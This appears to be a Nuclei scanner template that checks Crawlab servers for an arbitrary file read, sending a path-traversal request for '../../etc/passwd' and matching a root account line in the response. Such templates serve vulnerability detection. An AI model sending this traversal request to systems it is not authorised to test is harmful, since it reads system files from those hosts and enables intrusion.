id: crawlab-lfi

info:
  name: Crawlab - Arbitrary File Read
  author: xc
  severity: high
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="Crawlab"
  tags: crawlab,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/file?path=../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "data\":\""
          - "error\":"
        condition: and

      - type: status
        status:
          - 200

